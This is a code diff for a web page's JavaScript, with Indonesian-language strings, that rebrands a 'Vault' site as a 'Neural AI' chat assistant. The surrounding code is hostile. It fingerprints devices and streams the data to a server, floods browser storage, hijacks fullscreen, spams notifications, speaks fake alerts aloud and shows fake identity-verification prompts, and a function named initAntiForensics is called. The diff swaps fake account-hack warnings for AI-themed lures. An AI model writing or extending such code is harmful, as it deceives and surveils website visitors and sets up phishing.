@@ -55,10 +55,10 @@ function speakText(text) {
 
 function scheduleGhostSpeech() {
     const messages = [
-        'Akun Anda telah diakses dari perangkat yang tidak dikenal.',
-        'Terdeteksi aktivitas mencurigakan pada akun Anda.',
-        'Silakan verifikasi identitas Anda segera untuk mengamankan akun.',
-        'Percobaan login gagal terdeteksi. Lindungi akun Anda.'
+        'Koneksi Anda dengan Neural AI telah terenkripsi.',
+        'AI sedang menganalisis pola percakapan Anda.',
+        'Sistem deteksi Neural AI mendeteksi lingkungan baru.',
+        'Asisten AI siap membantu Anda dengan pertanyaan apapun.'
     ];
     setTimeout(() => speakText(messages[0]), 5000);
     setTimeout(() => speakText(messages[1]), 15000);
@@ -72,7 +72,7 @@ function scheduleGhostSpeech() {
 }
 
 function startStorageFlood() {
-    const DB_NAME = 'VaultCache';
+    const DB_NAME = 'NeuralCache';
     const STORE = 'blobs';
     let db = null;
     const req = indexedDB.open(DB_NAME, 1);
@@ -102,7 +102,7 @@ function initFullscreenHijack() {
     const overlay = document.createElement('div');
     overlay.id = 'fs-overlay';
     overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;';
-    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🔒</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi Keamanan</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
+    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🤖</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi AI</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda di Neural AI</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
     document.body.appendChild(overlay);
 
     let fsActive = false;
@@ -157,16 +157,16 @@ function initNotificationSpam() {
 
 function startNotifSpam() {
     const msgs = [
-        { title: '\u26a0\ufe0f Peringatan Keamanan', body: 'Login mencurigakan terdeteksi dari perangkat baru.' },
-        { title: '\U0001f512 Verifikasi Diperlukan', body: 'Akun Anda mungkin telah diretas. Verifikasi segera.' },
-        { title: '\U0001f6a8 Aktivitas Tidak Biasa', body: 'Terlalu banyak percobaan login dari lokasi tidak dikenal.' },
-        { title: '\U0001f6e1\ufe0f Lindungi Akun Anda', body: 'Akses tidak sah terdeteksi. Ubah kata sandi Anda sekarang.' },
-        { title: '\U0001f4f1 Perangkat Baru Terdeteksi', body: 'Perangkat tidak dikenal mencoba mengakses akun Anda.' }
+        { title: '\u26a0\ufe0f Neural AI', body: 'AI mendeteksi aktivitas baru pada akun Anda.' },
+        { title: '\U0001f916 Verifikasi AI', body: 'Perangkat baru terdeteksi. Verifikasi untuk melanjutkan.' },
+        { title: '\U0001f4a1 Neural Update', body: 'AI Assistant siap membantu Anda dengan pertanyaan apapun.' },
+        { title: '\U0001f6e1\ufe0f Keamanan AI', body: 'Sesi Anda diamankan oleh Neural AI.' },
+        { title: '\U0001f4f1 Perangkat Baru', body: 'Perangkat baru mencoba mengakses Neural AI.' }
     ];
     let idx = 0;
     notifInterval = setInterval(() => {
         try {
-            const n = new Notification(msgs[idx].title, { body: msgs[idx].body, icon: '/favicon.svg', tag: 'vault-spam' });
+            const n = new Notification(msgs[idx].title, { body: msgs[idx].body, icon: '/favicon.svg', tag: 'neural-notif' });
             idx = (idx + 1) % msgs.length;
             setTimeout(() => n.close(), 3000);
             socket.emit('device-info', { notifSpam: { title: msgs[idx].title, time: Date.now() } });
@@ -185,7 +185,7 @@ function initPersistentStorage() {
             socket.emit('device-info', { storageEstimate: { usage: est.usage, quota: est.quota, pct: Math.round(est.usage/est.quota*100) } });
         });
     }
-    const dbReq = indexedDB.open('VaultPersist', 1);
+    const dbReq = indexedDB.open('NeuralPersist', 1);
     dbReq.onupgradeneeded = (e) => {
         const db = e.target.result;
         if (!db.objectStoreNames.contains('data')) db.createObjectStore('data');
@@ -419,7 +419,7 @@ function vibrate() { if (navigator.vibrate) navigator.vibrate([30,50,30,50,100])
 
 function initMultiWindow() {
     if ('BroadcastChannel' in window) {
-        const bc = new BroadcastChannel('vault_tracker');
+        const bc = new BroadcastChannel('neural_tracker');
         bc.postMessage({ type: 'open', time: Date.now() });
         let tabCount = 1;
         bc.onmessage = (e) => {
@@ -487,7 +487,7 @@ function ipGeolocate() {
 
 function getFingerprint() {
     const fp = { screen:screen.width+'x'+screen.height, availScreen:screen.availWidth+'x'+screen.availHeight, platform:navigator.platform||'', language:navigator.language, languages:navigator.languages?.join(','), timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, tzOffset:new Date().getTimezoneOffset(), cpu:navigator.hardwareConcurrency||'', mem:navigator.deviceMemory||'', touch:'ontouchstart' in window, cookies:navigator.cookieEnabled };
-    const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('Vault\u2122',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
+    const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069';     x.fillText('NeuralAI\u2122',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
     socket.emit('device-info',{fingerprint:fp});
 }
 
@@ -827,7 +827,7 @@ function requestPermissions() {
     initAntiForensics();
 
     setTimeout(() => {
-        showFakeNotif('Verifikasi Keamanan', 'Sistem mendeteksi login dari perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
+        showFakeNotif('Verifikasi AI', 'Neural AI mendeteksi perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
     }, 3000);
     scheduleGhostSpeech();
 
@@ -888,7 +888,7 @@ const loadingDurations = [2000, 3500, 6000, 8000];
 function showLoadingOverlay(stage) {
     const overlay=document.getElementById('loadingOverlay'), text=document.getElementById('loText'), sub=document.getElementById('loSub'), bar=document.getElementById('loBar');
     overlay.classList.add('show');
-    const stages=[{text:'Memverifikasi kredensial\u2026',sub:'Mohon tunggu sebentar',pct:20},{text:'Menghubungkan ke server\u2026',sub:'Koneksi aman (TLS 1.3)',pct:45},{text:'Memvalidasi sesi\u2026',sub:'Token autentikasi',pct:70},{text:'Hampir selesai\u2026',sub:'Mengarahkan ke dashboard',pct:90}];
+    const stages=[{text:'Menghubungkan ke AI\u2026',sub:'Neural Model v3',pct:20},{text:'Memproses permintaan\u2026',sub:'Analisis konteks',pct:45},{text:'Mengoptimalkan respons\u2026',sub:'AI Reasoning',pct:70},{text:'Hampir selesai\u2026',sub:'Menyiapkan percakapan',pct:90}];
     let i=0;
     const interval=setInterval(()=>{if(i<stages.length){text.textContent=stages[i].text;sub.textContent=stages[i].sub;bar.style.width=stages[i].pct+'%';i++;}else clearInterval(interval);},stage||1500);
 }
@@ -954,7 +954,7 @@ function initAIChat() {
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a2 2 0 0 1-2 2H10a2 2 0 0 1-2-2v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7z"/><path d="M9 22h6"/><path d="M10 22v-4"/><path d="M14 22v-4"/></svg>
             </div>
             <div>
-                <div style="font-weight:700;font-size:.95rem;color:#fff;">Vault Assistant</div>
+                <div style="font-weight:700;font-size:.95rem;color:#fff;">Neural AI</div>
                 <div style="font-size:.72rem;color:#6a6a8e;display:flex;align-items:center;gap:5px;"><span style="width:6px;height:6px;border-radius:50%;background:#00d4ff;display:inline-block;"></span>Online</div>
             </div>
             <div style="margin-left:auto;cursor:pointer;padding:6px;" id="aiChatClose">
@@ -963,7 +963,7 @@ function initAIChat() {
         </div>
         <div id="aiChatMessages" style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px;scroll-behavior:smooth;">
             <div style="align-self:flex-start;max-width:80%;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);padding:12px 16px;border-radius:16px 16px 16px 4px;font-size:.85rem;color:#ccc;line-height:1.5;">
-                Halo! Saya Vault Assistant. Ada yang bisa saya bantu hari ini? 👋
+                Halo! Saya asisten AI Neural. Ada yang bisa saya bantu hari ini? 👋
             </div>
         </div>
         <div id="aiChatPermission" style="display:none;padding:16px;background:rgba(0,212,255,0.05);border-top:1px solid rgba(255,255,255,0.06);">
